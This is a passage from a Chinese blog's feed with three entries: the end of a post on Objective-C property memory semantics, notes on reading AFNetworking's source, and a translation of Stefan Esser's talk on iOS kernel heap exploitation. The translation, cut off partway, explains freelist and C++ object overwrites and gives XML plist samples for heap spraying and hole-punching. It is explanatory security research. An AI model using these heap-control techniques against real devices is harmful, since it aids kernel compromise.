不会被置为 nil 。但对于非 OC 对象来讲，因为其存储空间在栈上，由系统管理内存，所以一般还是使用 assign。 unsafe_unretainedunsafe_unretained 的语义与 assign 类似，相当于用于 OC 对象类型的 assign 。使用这个关键字主要出于性能考虑，因为 weak 对性能有一些影响，因此对性能要求高的地方可以考虑使用 unsafe_unretained 替换 weak 。比如 YYModel 的实现，为了追求更高的性能，其中大量使用 unsafe_unretained 作为变量标识符。 retain 与 strong 知识点: MRR内存管理基本原则 为创建的所有对象设置所有权 应使用retain方法获取对象（你尚未拥有）的所有权 当不再使用某个对象时，必须放弃其所有权 不能放弃不归你所有的对象的所有权 123456789101112//对象通过 alloc 消息创建后，变量 atom 就拥有了该对象的所有权（原则1）Atom *atom = [[Atom alloc] init];//变量 href 获取了这个对象的所有权（原则2），不能写成 Atom *href = atom; //这样写的话 href 没有获取对象的所有权，一旦 atom 释放了，href 就不再指向一个合法的位置，出现指针悬空。Atom *href = [atom retain];// 变量 atom 释放，但 href 依旧拥有该对象的所有权[atom release];// 变量 href 释放，对象引用计数变为 0 ，运行时系统可以释放对象了[href release]; ——引用自[精通Objective-C]内存管理 如果设置 retain ，在 setter 方法中是这样的： 123456- (void)setCarName:(NSString *)name &#123; if (_carName != name) &#123; [_carName release]; _carName = [name retain]; &#125;&#125; 也就是说，retain/strong 会在 setter 方法中，对传入的对象 &quot;Amywushu&quot; 进行引用计数 +1 的操作。简单来说，就是会拥有传入对象 &quot;Amywushu&quot; 的所有权，而不是像 assign/weak 一样，依赖于传入的对象指针 name ，而并非拥有实际所有权。 相当于一个保险柜拥有两把钥匙，变量解除所有权 (release) ，也就相当于归还钥匙。当两把钥匙都被归还之后，这个保险柜（对象）也就会被释放。只要拥有该对象的所有权（至少有一把钥匙没有归还），这个对象就不会被释放。 如图所示，_carName 和 name 均拥有对 Amywushu 这个字符串对象的所有权，该对象的引用计数变为 1+1=2 。 strong 是在 iOS 引入 ARC 的时候引入的关键字，是retain的一个可选的替代。 strong 跟 retain 的意思相同并产生相同的代码，但是语意上更好更能体现对象的关系。 关于 strong 和 weak 还有什么不清楚的话，可以学习 onevcat 的手把手教你ARC——iOS/Mac开发ARC入门和使用这篇文章，讲得非常清晰易懂。 copy 与 mutableCopycopy 、mutableCopy 与 strong 的区别在于，深拷贝时，示例变量对于传入对象的副本拥有所有权，而不是对象本身；浅拷贝时，则没有区别。如果设置 copy ，在 setter 方法中是这样的： 123456- (void)setCarName:(NSString *)name &#123; if (_carName != name) &#123; [_carName release]; _carName = [name copy]; &#125;&#125; 如上图所示，原来对象的 retainCount 不变，新 copy 出来的对象副本的 retainCount=1 ，原对象引用计数不变，两者 copy 之后互不相关，这是深拷贝。 深拷贝与浅拷贝 深拷贝： 是对内存空间的拷贝，也就是这里的 copy（数组等类型例外）浅拷贝： 是对内存地址的拷贝，也就是上面的 retain/strong，以及 copy 的某些情况深拷贝和浅拷贝比较复杂，我的另一篇文章有具体讲解copy 与 mutableCopy（传说中的深浅拷贝），这里只是简要提及一下。 注意！ 如果是 copy 的是一个 NSArray 呢? 比如： 12NSArray *array = [NSArray arrayWithObjects:@"hello",@"world",@"baby"];NSArray *array2 = [array copy]; 这个时候,系统的确是为 array2 开辟了一块内存空间,但是我们要知道的是, array2 中的每个元素,,只是 copy 了指向 array 中相对应元素的指针，这是“单层深拷贝”. 一般来说，不要将 copy 用到 NSMutableString ，NSMutableArray ，NSMutableDictionary 等可变对象上，除非有特别的需求。 例如: 1234567891011121314@interface ViewController ()@property (nonatomic, copy) NSMutableArray *mutableArray_copy;@end@implementation ViewController- (void)viewDidLoad &#123; [super viewDidLoad]; NSMutableArray *mutableArray = [NSMutableArray arrayWithObject:@"123"]; self.mutableArray_copy = mutableArray; [self.mutableArray_copy addObject:@"456"];&#125; 运行则会报出错误 signal SIGABRT 我们明明在代码里用的 NSMutableArray 这个可变数组，为什么错误里会说是在向 NSArray 这个不可变数组，调用 addObject: 这个方法呢？（ __NSArrayI 表示的是 NSArray 类型）。是因为在 self.mutableArray_copy = mutableArray; 这一句的时候，会调用 mutableArray_copy 的 setter 方法， copy 属性默认 setter 方法是这样写的: 123- (void)setMutableArray_copy:(NSMutableArray *)mutableArray_copy &#123; _mutableArray_copy = [mutableArray_copy copy];&#125; setter 方法里调用的是 copy，而不是 mutableCopy ，也就是说拷贝过来的是不可变的 NSArray 类型。那么 NSMutableArray 的添加元素等方法自然就不能使用了。解决方法为：将 copy 改为 strong ；或者重写 setter 方法，将 copy 改为 mutableCopy 。 copy 现在都比较少用，一般用于 NSString 。因为父类指针可以指向子类对象，NSMutableNSString 是 NSString 的子类，使用 strong 的话虽然 NSString 是不可变对象，但是它传入的值可能会是 NSMutableString 可变对象，如果这个可变对象的内容在其他地方被修改了，那 NSString 指针所指的对象也随之改变了，而其本身可能对此毫不知情。因此一般用 copy 。 nonull nullable null_resettable这三个属性关键字是 WWDC2015 中介绍的 OC 新特性，与 Swift 中的 ? 和 ! 类似。 nonull：该属性不能为 nil ,必须有值。 nullable：表示可选的，可以为 nil。 null_resettable：表示 setter 方法是 nullable ,可以为 nil；而 getter 方法是nonull ，必须有值。 总结总的来说，就是内存处理方式不一样，assign/weak 相当于借用传入的指针变量来指向对象（实际上并不是，可以这样理解），retain/strong 相当于不同的指针变量指向同一个对象，copy 则是在内存里复制了一个对象并指向它。读写属性以及原子性比较简单，不再赘述。 关于 atomic 的锁机制，以及 ARC 机制到底如何进行的内存管理，之后会进一步学习。敬请期待。 2016.12.07 补充： 新增博文： ARC 是如何进行内存管理的 Reference[1] Objective-C 内存管理——你需要知道的一切 https://segmentfault.com/a/1190000004943276[2] @property属性关键字详解 http://www.wugaojun.com/blog/2015/07/25/at-propertyshu-xing-guan-jian-zi-xiang-jie/[3] Objective-C 的自动引用计数（ARC） https://hran.me/archives/objective-c-automatic-reference-counting.html[4] Objective-c 内存管理的历史和参考资料 http://www.pchou.info/ios/2015/06/05/oc-memory-management.html 声明: 本文转载需标明出处，禁止用于商业目的。]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[AFNetworking 3.1.0 第一部分]]></title>
      <url>https://amywushu.github.io/2016/09/06/%E6%BA%90%E7%A0%81%E5%AD%A6%E4%B9%A0-AFNetworking-3.1.0-%E7%AC%AC%E4%B8%80%E9%83%A8%E5%88%86.html</url>
      <content type="text"><![CDATA[空山新雨后，天气晚来秋。 ——王维《山居秋暝》 写在前面我主要根据作者polobymulberry的博客AFNetworking源码阅读系列来学习，因为我有很多知识不懂，所以有些地方可能会记录得过于繁琐。原作者的大体流程和记录不变，某些知识点会有自己的补充。在此非常感谢博客作者polobymulberry的分享。 第一次运行运行example时总是出现 Module ‘AFNetworking’ not found 问题，查了好多关于Module的资料，对于问题的解决却没有帮助，后来偶然间在AFNetworking的github上的issues里找到解决办法，真是特别惭愧。应该点击文件夹内的AFNetworking.xcworkspace，而不是其他.xcodeproj文件。 图片1 运行成功后，就开始我们艰难的学习旅程吧！ 开始AppDelegate此文件主要就是实现函数didFinishLaunchingWithOptions。将windows的rootViewController设置为rootViewController为GlobaltimelineViewController的NavigationController。此处有两点需要注意一下： 第一处 NSURLCache *URLCache = [[NSURLCache alloc] initWithMemoryCapacity:4 * 1024 * 1024 diskCapacity:20 * 1024 * 1024 diskPath:nil]; [NSURLCache setSharedURLCache:URLCache]; NSURLCache 为您的应用的 URL 请求提供了内存中（对应memoryCapacity）以及磁盘上（对应diskCapacity）的综合缓存机制。所以你想使用NSURLCache带来的好处，就需要在此处设置一个sharedURLCache。 第二处 [[AFNetworkActivityIndicatorManager sharedManager] setEnabled:YES]; 为了说明AFNetworkingActivityIndicator是什么，直接上图： 图2 当你有session task正在运行时，这个小菊花就会转啊转。这个是自动检测的，只需要你设置AFNetworkingActivityIndicatorManager的sharedManager中的enabled设为YES即可。 这里我简单看了下AFNetworkingActivityIndicatorManager，发现它对外接口不多，比较容易理解它的业务流程。所以我准备在第三部分就将AFNetworkingActivityIndicatorManager的源码拿下。 设置完了cache和AFNetworkingActivityIndicator，接着就是进入GlobalTimelineViewController（UITableViewController）了。这里我学到一个，就是UITableViewController可以使用initWithStyle进行初始化。（因为我对iOS界面不太了解，所以这个initWithStyle现在并不懂） polobymulberry在开篇画了一个iOS Example的代码结构图，我不太懂MVC，特地查了下。以下是我个人非常粗浅的了解： M代表Model，V代表View，C代表Cotroller。这是一种设计模式，是想让各模块分离，视图跟数据处理以及中间的控制协调端各司其职。 视图只用于展现APP的界面，用于人和程序的交互。至于你点击按钮后产生的反馈，是由Controller来传递给Model处理，比如点击按钮后，会在文本框内展现文字。则Model从数据库中读取文字并通知Controller，事件已经处理完，Controller收到通知然后决定怎么处理，比如通过outlet控制View展示文字。 注意View和Model之间并不直接通信。 图3 参考自实际案例讲解iOS设计模式——MVC模式 GlobalTimelineViewController主要是围绕UITableView的delegate和dataSource来说。 1) UITableViewDelegate主要是计算heightForRowAtIndexPath这个函数比较麻烦（应该是-(CGFloat)tableView:heightForRowAtIndexPath:函数），这里的Cell比较简单，可以直接使用posts中存储的text值来计算高度，核心代码就下面这句： CGRect rectToFit = [text boundingRectWithSize:CGSizeMake(240.0f, CGFLOAT_MAX) options:NSStringDrawingUsesLineFragmentOrigin attributes:@{NSFontAttributeName: [UIFont systemFontOfSize:12.0f]} context:nil]; 对于boundingRectWithSize的使用又增进了一步。（这里我也不懂） 2) UITableViewDataSource主要是用posts作为数据源，而posts的获取在此处尤为关键，是通过Post本身（model）的globalTimelinePostsWithBlock函数获取数据的，这里作者将网络端的请求放在了model里面。 接着调用了refreshControl控件的setRefreshingWithStateOfTask:。setRefreshingWithStateOfTask:其实是UIRefreshControl+AFNetworking的一个category中定义的。UIRefreshControl+AFNetworking的源码很简单，放在第四部分讲。 注意setRefreshingWithStateOfTask:有一个参数就是NSURLSessionTask*。而这个NSURLSessionTask的获取是调用了Post类中的globalTimelinePostsWithBlock:函数。 在globalTimelinePostsWithBlock:函数中其实封装了一层AFHTTPSessionManager的GET函数 - (nullable NSURLSessionDataTask *)GET:(NSString *)URLString parameters:(nullable id)parameters progress:(nullable void (^)(NSProgress *downloadProgress)) downloadProgress success:(nullable void (^)(NSURLSessionDataTask *task, id _Nullable responseObject))success failure:(nullable void (^)(NSURLSessionDataTask * _Nullable task, NSError *error))failure; 具体细节后面讨论，此处我们知道是根据一个url获取到服务器端的数据即可。注意获取到的数据是JSON格式的，这里作者在Post类，即Model中定义了一个JSON—-&gt;Model函数-initWithAttributes，，也就是说模型数据转化部分也放在了model中。 另外，调用GET方法不是直接用AFHTTPSessionManager的manager，而是又定义了一个AFAppDotNetAPIClient，继承自AFHTTPSessionManager。并在其定义的单例模式中简单地封装了一些AFHTTPSessionManager的设置。 + (instancetype)sharedClient { static AFAppDotNetAPIClient *_sharedClient = nil; static dispatch_once_t onceToken; dispatch_once(&amp;onceToken, ^{ // 初始化HTTP Client的base url，此处为@&quot;https://api.app.net/&quot; _sharedClient = [[AFAppDotNetAPIClient alloc] initWithBaseURL:[NSURL URLWithString:AFAppDotNetAPIBaseURLString]]; // 设置HTTP Client的安全策略为AFSSLPinningModeNone _sharedClient.securityPolicy = [AFSecurityPolicy policyWithPinningMode:AFSSLPinningModeNone]; }); return _sharedClient; } 知识点：SSL Pinning Https对比Http已经很安全，但在建立安全链接的过程中，可能遭受中间人攻击。防御这种类型攻击的最直接方式是Client使用者能正确鉴定Server发的证书【目前很多浏览器在这方面做的足够好，用户只要不在遇到警告时还继续其中的危险操作】，而对于Client的开发者而言，一种方式保持一个可信的根证书颁发机构列表，确认可信的证书，警告或阻止不是可信根证书颁发机构颁发的证书。 SSL Pinning其实就是证书绑定，一般浏览器的做法是信任可信根证书颁发机构颁发的证书，但在移动端【非浏览器的桌面应用亦如此】，应用只和少数的几个Server有交互，所以可以做得更极致点，直接就在应用内保留需要使用的具体Server的证书。对于iOS开发者而言，如果使用AFNetwoking作为网络库，那么要做到这点就很方便，直接证书作为资源打包进去就好，AFNetworking会自动加载，具体代码就不贴了，nsscreencast已经有很好的tutorial。 至于model根据网络层获取的数据赋值，除了user的头像那块比较难，因为涉及到UIImageView+AFNetworking等文件，其他部分很简单。而AFNetworking的UIImageView+AFNetworking的部分其实很类似SDWebImage的思路。 Add：BLock作为函数参数block原本的形式为: 返回值 (^block名称 可省) (参数 可省) ＝ ^{函数体};调用形式： block名称(参数); 在GlobalTimelineViewController.m - (void)reload: 函数中遇到了第一个block NSURLSessionTask *task = [Post globalTimelinePostsWithBlock:^(NSArray *posts, NSError *error) { if (!error) { self.posts = posts; [self.tableView reloadData]; } }]; ^(NSArray *posts, NSError *error){} 整个block作为参数传递给+ (NSURLSessionDataTask *)globalTimelinePostsWithBlock:函数 参数传递只需要 ^(参数){block函数体} ^表明是block形式 Post.m + (NSURLSessionDataTask *)globalTimelinePostsWithBlock:函数: + (NSURLSessionDataTask *)globalTimelinePostsWithBlock:(void (^)(NSArray *posts, NSError *error))block { ...... } 即这个函数的参数为(void (^)(NSArray posts, NSError error))block (返回值 (^)(参数))block名称 也就是说在block作为函数参数传递时，定义block的这个A函数(globalTimelinePostsWithBlock:)并没有block函数体，而是调用A函数([Post globalTimelinePostsWithBlock:])在传参数时定义block的具体执行内容。 声明: 本文转载需标明出处，禁止用于商业目的。]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[（译） iOS Kernel Heap Armageddon —— Stefan Esser]]></title>
      <url>https://amywushu.github.io/2016/08/29/%E8%AF%91-iOS-Kernel-Heap-Armageddon.html</url>
      <content type="text"><![CDATA[人世间最让你感动的是什么？ ——是遥远的相似性 （霍金答记者问） 摘要你所了解到的关于 iOS 内核堆利用的公开研究，最终都可以归结于对内核堆空间的分配，这个观点由 nemo 首先提出来。总而言之，这种分配将空间内的内核内存分成相同大小的内存块。通过利用重写堆元数据，可以向空间的空闲列表 (freelist) 中注入任意内存区。 在本文中，我们将首先概括关于内核堆空间分配的知识，像 nemo 和 Esser 之前所提到的那样。接着，我们将看一看其他的内核堆管理以及 Mac OSX 和 iOS 内核中的内存分配封装函数。在简单介绍这些封装函数之后，我们将进一步介绍这些分配器在最新版本 iOS 5 之后的改变。本文将继续介绍内核层的应用数据重写与直接攻击分配器的空闲列表区之间的差异。最后将展示一种普遍的技术：为了实现内核堆利用，通过执行内核堆喷射 (heap spraying) ，来控制内核堆布局的布局。 内核堆空间分配对于 Mac OSX 以及越狱的苹果手机，有一种可用的工具叫做 zprint ，它可以查看由内核堆分配器注册的内核内存空间。例如： 这些信息都是由内核 API 函数 host_zone_info 以及 mach_zone_info 提供的。当涉及到构造内核堆利用方法时，这些 API 函数都非常有用，因为它们可以检索每个内核空间的详细信息，比如分配的块的数量，空闲内存块的数量等。Sotirov提到：后者对于控制内核堆（又称为堆风水）技术非常有用。但是根据苹果 iOS 6 的介绍，为了防止内核 API 函数被用于工厂 设备iPhone ，这条路已经被关闭了。现在调用 PE_i_can_haz_debugger 函数，在越狱机以及特殊的苹果内部调试设备、通过苹果可能有的特殊调试虚拟磁盘启动的设备上，只会返回 true。不管怎样，以后的内核堆利用已经不能再依赖这些函数了。 为了弄清楚内核堆分配器是如何工作的，我们可以通过下面的图表了解，这些图表将会一步步记录其内部的运行。分配器将内核内存分成了许多空间，每个空间包含了同样大小的内存块。它首先在空间内分配一大块内存（通常是一个单独的内存页）。 所有的内存都在这个空间里，然后它被分为大小相同的块。在这个例子中，每块内存正好为 512bytes 。 内存管理器用每个空闲内存块的 4 个首字节作为指向另一个内存块的指针。如下图所示： 空间分配器创建了一个空闲内存块链表，即空闲列表。它是一个后进先出的列表，在链表内，每个元素都指向下一个元素。因为在新的内存页里的第一个空闲内存块首先被添加，正如下图所示，空闲内存将会被反序利用。 某特定空间的最后一个元素被添加到空闲列表后，当内存被分配给这个特定空间时，该元素也被称为空闲列表头部，同时作为分配内存块标识返回。返回新分配的内存之后，空闲列表中下一个元素的指针从内存块的首4字节读取。指针读取成为新的自由列表头部。它指向的内存块将会因此成为下一个返回值。这个原则由下图证实。 现在我们知道了堆空间分配的基本机制，接下来我们介绍一下如何利用这种内存分配。我们发现，两个相邻的内存块，第一个为分配缓存区，第二个为空闲内存块，缓存区溢出将会导致堆元数据被覆盖。 如果攻击者控制了缓存区溢出的数据，那么他完全可以控制空闲列表中指向下一个元素的指针。如上所述的分配将会返回被重写的内存块，使得攻击者控制空闲列表的头部指针。之后分配器将会返回一个被攻击者控制的内存块。在公开的 iOS 内核堆利用中，这种技术被用来返回位于系统调用表中间的一块内存。通过强制内核分配一块内存，并用被攻击者控制的数据覆盖，这种方式可以替换任意系统调用处理程序，并实现任意内核代码执行。 据了解， iOS 6 的测试版在内核堆分配器中添加了一些内存标签，虽然一般来说，它不阻止攻击空闲列表，但是阻止公开地使用攻击，因为它只允许向内核的空闲列表中注入内存块，但是这样也已经完全在攻击者的控制之下了。 其他内核堆内存管理和封装器Mac OSX 和 iOS 内核包含了许多其他的内核堆内存管理以及封装。下图展示了其中一部分的封装和内存管理。 在本节中，我们将介绍几个提到的分配器和封装，并讨论它们的属性以及利用。 kalloc() kalloc() 是用来封装 zalloc() 以及 kmem_alloc() 的。它在小分配时使用 zalloc() ，较大的内存请求时使用 kmem_alloc() 。它没有任何额外的堆元数据。因此，需要调用者记住分配的内存大小，当稍后内存使用 kfree() 释放时要求使用相同大小的值。 存储在内核空间的数据由内存管理器注册一个空间号码，这个号码为 kalloc.xxx ，xxx 即为 kalloc 空间大小。在 iOS 5 中可使用 zprint 工具得到以下空间。(译者注：在OS X 10.11 及以上系统可在 root 权限下使用 zprint | grep kalloc 命令) 可以从中发现，这个内核空间是在 8 到 8192 之间的每2倍大小再加上一些额外的空间值，这些额外值的大小是2倍之间可被8整除的数。比如 kalloc.24, kalloc.40, kalloc.48, kalloc.88, kalloc.112, kalloc.192, kalloc.384, kalloc.768, kalloc.1536, kalloc.3072 以及 kalloc.6144 。在 iOS 5 之前，这些 kalloc 空间并不存在，且最小的空间为 16 。这种增加空间的变化可能是为了减少内存浪费，以便使得最常用的分配越来越合适。 kfree() 在跳转到下一个封装之前，还有一些值得注意的地方，kfree() 函数。正如之前所提到的那样，调用者需要记住需要释放的块的大小，否则 kfree() 不知道 zfree() 或 kmem_free() 是否被调用，以及需要向内存返回多大的空间。内存管理器除了保持对较大的分配内存块的跟踪之外，对于释放一个比之前所记忆值大的块的尝试将会被忽略。这是一个简单的保护机制防止二次释放。 _MALLOC() _MALLOC() 是一个对 kalloc() 函数的封装。对于分配的内存块它预先留下一个简短的头部，存储分配的大小。这种通过 _MALLOC() 进行内存分配的方式，在内核代码中可以在不需要保持对块大小的跟踪的情况下释放。下图是一个通过系统调用的内存分配例子。 0字节的分配是特例。_MALLOC() 会简单拒绝这样的分配并返回一个空指针。目前尚不知道为什么苹果不返回一个最小大小的分配值，因为分配 0 字节是可以在合理条件下发生的。用大小作为头部有两个缺点，第一为了确定分配的大小，它要求有整数加法，第二当重写导致可执行的情况，它相当于额外的堆元数据。 当看到 iOS 4 中的 XNU源代码树中的源代码，可以发现 _MALLOC() 中整数加法的危险是显而易见的。正如下面代码所示，苹果并没有设定在 iOS 4 以及 Mac OSX 中的整数溢出，这将会导致许多可能的内核堆错误。 但是在 iOS 5 的 release 版本之前，苹果研究了可能的整数溢出并关闭了它。代码改为捕捉整数溢出，防止在非阻塞情况下，溢出流返回空指针。但是在阻塞情况下，可以看到触发了内核 panic。 包含了额外大小字段的内存块头部，对于重写来说，是一个非常有趣的目标，因为通过重写它，内存管理器可以被欺骗去释放错误区域的空闲列表中的内存块。如果大小被重写为一个更小的值，这个块也将会被添加到更小尺寸的块的空闲列表中。这不会导致内存错误，但将会导致内存泄漏，因为稍长的那部分永远不会被覆盖。同样，如果一个较大的尺寸被写入头部，这个块也会被添加到较大尺寸块的自由列表中。这样将会导致内存错误，因为内核分配相信块比实际尺寸大，而这将会导致它在填满时覆盖到相邻的内存。 内核堆应用数据重写考虑到苹果正在硬化空间分配器，一些内存分配器也将不再会有流入的堆元数据可以被覆盖，因此我们将要介绍一种有攻击性且有趣的存储在堆上的内核应用数据。本节的剩余部分，我们将使用内核层的 C++ 对象作为这种有趣的可以被广泛使用的应用数据的示例。 在 iOS 内核中的 libkern 实现了一个 C++ 运行时子集。它允许内核驱动程序用 C++ 写，其中 IOKit 驱动使用最为频繁。这太有意思了，因为它为 iOS 内核带来了 C++ 类的漏洞。但是对于我们来说，只有在内存布局中的类是有意义的 下图展示了一个支持 iOS 内核的 C++ 运行时以及继承的基本对象的概述： 正如你所看见的，所有的这些类都是由基类 OSObject 分发而来的。接下来我们将要更进一步查看这些类的内存排布。可以看到 OSObject 由一个 vtable ptr 和一个引用计数器组成： vtable ptr 指向内核的数据段，即对象的方法表的存储位置。另一方面，引用计数器要稍微复杂一点。它是一个将 16bit 引用计数存储在低 16 位的 32bit 值。用高 16 位计数对象在集合中的频率，作为第二参考计数。貌似设计的最初目的是用来调试，因为集合计数看起来只能用来验证正常引用计数不低于集合计数。如果是这样，则任何情况都能导致内核 panic 被触发。引用计数器特别的一点是它有一个内置的整数溢出保护。如果引用计数器的值达到65534，则计数器将会被冻结，意味着它将既不会增加，也不会再减少。因此该对象不再可以被破坏，它的内存也不会被释放。 为了明白 iOS 内核对象重写是如何被利用的，首先需要弄清楚在内存中一个 OSObject 的每个部分被重写的影响。如果可以重写 vtable ptr，则可以改变用于查找对象方法的表中的地址。一旦这个指针被重写了对象上的每一个执行操作，将会导致任意内核代码执行。如果引用计数器被重写，将会允许将引用计数器设置为一个小于现有的实际引用计数的值。同时允许释放之前的对象，这将会导致一种典型用法，即通过悬挂引用引起的任意利用。一旦释放了下一个相同大小的分配内存，则对象的内容将会被完全替换。 在 iOS 内核中， OSObject 是一个最简单的 C++ 对象。其他对象比如 OSString 则更复杂一些，包含有更多数量或者更多不同类型的属性。进一步分析它们的内存布局也将会因此变得有趣。首先，让我们看看 OSString 对象，它的内存布局如下图所示。 除了 OSObject 中已知的属性外，flags，length 和 string ptr 三个是新增的。flags 只是控制对象内部的字符串指针是否在其被销毁时释放。这通常只在其他的字段同时被重写时有用。更有用一点的是 length 字段。如果字符串的长度被改变为一个大于原始值的数值，则会导致内核堆信息泄漏或者破坏的内存错误。内存错误是由于长度太大，进而导致长度较小的内存块被添加到错误的内核堆空间的空闲列表里。如果被释放的内存在之后重新分配，则返回的指针将会指向一个实际小于预期的内存块。当内核中的这个小内存块被数据填满时，多余的数据则会重写到相邻的内存中。最后一个字段可以被字符串指针自身重写。同样，该指针被重写，也会导致内核堆信息泄漏或者破坏的内存错误。这种情况下，攻击者可以向特殊空间的空闲列表注入一段任意内存地址，一旦那段内存被内核重新分配然后填满，将导致内存破坏。 另外一个有意思的重写对象是 OSArray 。它包括了更多的属性，因此也提供了一些新的有趣的重写可能性。让我们看一下 OSArray 对象的内存布局： updateStamp, reserved 以及 fOptions 字段对于重写来说没有什么用处，因为它们不能导致有用的可利用的场景。但是其他的字段都可以。count, capacity 和 capacityIncrement 字段都是由 kalloc() 分配的内存的值。重写这些值将会混淆内存，使得它分配或者再分配错误数量的内存。这种做法将会导致内核堆信息泄漏或者破坏的内存错误。最后一个字段 array ptr 是来自于 OSObject 的对象指针。重写它使得内核可以访问任意构造的对象，从而导致内核里的任意代码执行。另一种攻击是直接重写存储数据的内存块。 我们对于 重写 iOS 内核的 C++ 对象的内存布局，以及由此产生的可行性做了一个简单概述。记住这些信息，在下一节中，我们将利用这些对象来填充 iOS 内核堆并控制它的布局。 控制 iOS 内核堆要成功利用内核堆错误，则要求将内核堆从一个未知起点通过可控制的方式指向一个可预测的状态。对于这个需求，有很多不同的技术方法。其中最简单的方法叫做堆喷射 ( heap spraying ) ，即使用特殊的数据通过重复触发相同的分配来填充内存，直到内存中很大比例都被这种模式充满（或者触发另一个终止条件）。为了实现堆喷射，要求有一个分配基元来重复执行。由于这种技术早在 2001 年之前就已经开始使用，所以谁是堆喷射的最初发明者尚未可知。 A.Sotirov 在2007年提出了一个更复杂更好的用来控制堆状态的技术，叫做堆风水。在他的黑帽子谈话中，他描述了如何从未知状态的堆得到被控制的内存布局。首先需要重复分配内存来填充堆中的空洞。一旦所有的空洞都被封闭了，则进一步的分配将会使得彼此相邻。在这些相邻的区域释放内存块，将会在可控位置戳一些洞，使得接下来的分配都在这些洞的位置上。这种方式可以控制堆布局，即溢出缓存区将会正好溢出我们想要溢出的数据。当然，实现一个堆风水技术也要比堆喷射更复杂，它不仅需要一个分配基元，还需要一个回收基元。 在以前的公开 iOS 内核利用中，分配以及回收基元通常是特殊的，且依赖于实际的开发功能。在此，我们将介绍一个更为通用的方法，可以在没有易被攻击的特殊分配和回收基元的条件下，控制内核堆。 iOS 内核有一个非常有趣的函数叫做 OSUnserializeXML()。它由许多 IOKit API 中的函数来调用，被用于将对象从用户空间传送到内核空间。这个函数以 XML.plist 的格式 提供一个输入，可以是数字，布尔量，字符串，数据，字典，数组，集合和引用。下面是一个 XML plist 的例子。 &lt;plist version=&quot;1.0&quot;&gt; &lt;dict&gt; &lt;key&gt;IsThere&lt;/key&gt; &lt;string&gt;one technique to rule them all?&lt;/string&gt; &lt;key&gt;Answer&lt;/key&gt; &lt;true /&gt; &lt;key&gt;Audience&lt;/key&gt; &lt;string&gt;meet OSUnserializeXML()&lt;/string&gt; &lt;/dict&gt; &lt;/plist&gt; 通过构建这样一个 XML.plist 数据包，可以在内存中创建任意对象集合，以及在所有大小和形状中，分配任意数量的不同类型的对象。我们可以用它来控制内核堆，以任何我们喜欢的方式。下表是一个基本对象的内存大小的备忘清单。 现在我们来看一下如何构造 XML 数据，使其实现堆喷射和堆风水。 重复分配 我们首先需要做的是分配任意大小任意数量的内存块。不幸的是，在 XML.plist 数据块内部进行循环是不可能的。但是也没有限制，因此我们可以按照我们的想法分配尽可能多的数据。 &lt;plist version=&quot;1.0&quot;&gt; &lt;dict&gt; &lt;key&gt;ThisIsOurArray&lt;/key&gt; &lt;array&gt; &lt;string&gt;again and&lt;/string&gt; &lt;string&gt;again and&lt;/string&gt; &lt;string&gt;again and&lt;/string&gt; &lt;string&gt;again and&lt;/string&gt; &lt;string&gt;again and&lt;/string&gt; &lt;string&gt;again and&lt;/string&gt; &lt;string&gt;...&lt;/string&gt; &lt;/array&gt; &lt;/dict&gt; &lt;/plist&gt; 这个示例使用一个数组对象，并填充任意数量的字符串。为了做一个内核堆喷射，我们只需要构建一个非常庞大的 XML 数据对象，并传给一个合适的 IOKit API 函数。 分配受攻击者控制的数据 在 iOS 内核堆喷射中，使用字符串数据对象的缺点是，不能包含空字节。因此，用完全任意数据结构的字符串对象来实现堆喷射是不可行的。不过我们还有数据对象可以施以援手。由于数据是 base64 编码的，所以它允许创建任意数据结构，没有字符值的限制。另外，内核也支持简单的 16 进制。比如下面的例子。 &lt;plist version=&quot;1.0&quot;&gt; &lt;dict&gt; &lt;key&gt;ThisIsOurData&lt;/key&gt; &lt;array&gt; &lt;data&gt;VGhpcyBJcyBPdXIgRGF0YSB3aXRoIGEgTlVMPgA8+ADw=&lt;/data&gt; &lt;data format=&quot;hex&quot;&gt;00112233445566778899aabbccddeeff&lt;/data&gt; &lt;data&gt;...&lt;/data&gt; &lt;/array&gt; &lt;/dict&gt; &lt;/plist&gt; 数据对象类型也更方便，因为它读取到4049块中，因此在解码 XML 时，它在我们感兴趣的内存空间中不分配块。通过结合数组和数据，我们可以执行内核水平的堆喷射。堆风水需要更多的控制条件，接下来我们会提到。 用应用数据填充任意大小的内存块 对于堆风水，我们不仅需要分配任意大小的内存块，还需要在重写导致的任意代码执行时，分配被数据填充的任意大小内存块。对于此，我们再次使用数据对象类型（当然也可以使用字典对象类型）。 &lt;plist version=&quot;1.0&quot;&gt; &lt;dict&gt; &lt;key&gt;ThisArrayAllocates_4_Bytes&lt;/key&gt; &lt;array&gt; &lt;true /&gt; &lt;/array&gt; &lt;key&gt;ThisArrayAllocates_12_Bytes&lt;/key&gt; &lt;array&gt; &lt;true /&gt;&lt;true /&gt;&lt;true /&gt; &lt;/array&gt; &lt;key&gt;ThisArrayAllocates_28_Bytes&lt;/key&gt; &lt;array&gt; &lt;true /&gt;&lt;true /&gt;&lt;true &gt;&lt;true /&gt;&lt;true /&gt;&lt;true /&gt;&lt;true /&gt; &lt;/array&gt; &lt;/dict&gt; &lt;/plist&gt; 在这个示例中，我们使用分配的数组来填充内存，并指向布尔对象。布尔量不会是单独的分配内存的对象。相反，它们会增加一个 global true 对象的引用计数。如果通过重写它向内核提供我们精心设计的对象，则会导致任意代码执行。字典对象类型可用于这种攻击。不同的是，在这个例子中，单个对象指针的乘数为 4，在字典中是 8，因为存储了 键值 (key) 和数值 (value) 对象的指针。 在分配区域戳洞 实现对内核堆完全控制的最后一件事是不仅需要分配任意大小的内存块，还需要能够在这些分配中戳任意大小的洞。在字典对象的帮助下，我们可以了解如何在已分配的内存中戳洞，请看下面的示例。 &lt;plist version=&quot;1.0&quot;&gt; &lt;dict&gt; &lt;key&gt;AAAA&lt;/key&gt; &lt;data&gt;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&lt;/data&gt; &lt;key&gt;BBBB&lt;/key&gt; &lt;data&gt;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&lt;/data&gt; &lt;key&gt;CCCC&lt;/key&gt; &lt;data&gt;ZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZ&lt;/data&gt; &lt;key&gt;DDDD&lt;/key&gt; &lt;data&gt;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&lt;/data&gt; &lt;key&gt;EEEE&lt;/key&gt; 